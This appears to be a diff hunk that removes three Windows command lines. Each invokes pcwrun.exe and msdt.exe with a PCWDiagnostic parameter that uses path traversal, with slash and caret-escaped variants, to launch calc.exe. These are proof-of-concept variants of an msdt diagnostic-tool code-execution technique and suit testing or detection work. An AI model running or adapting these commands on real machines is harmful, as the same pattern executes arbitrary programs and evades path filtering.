@@ -1,3 +1,0 @@
-pcwrun.exe "msdt.exe" /id PCWDiagnostic /skip true /param "IT_BrowseForFile=..//..//..//Windows/System32/calc.exe"
-pcwrun.exe "msdt.exe" /id PCWDiagnostic /skip true /param "IT_BrowseForFile=.^./.^./Windows/System32/calc.exe"
-pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param "IT_BrowseForFile=../../../../../../Windows/System32/calc.exe"
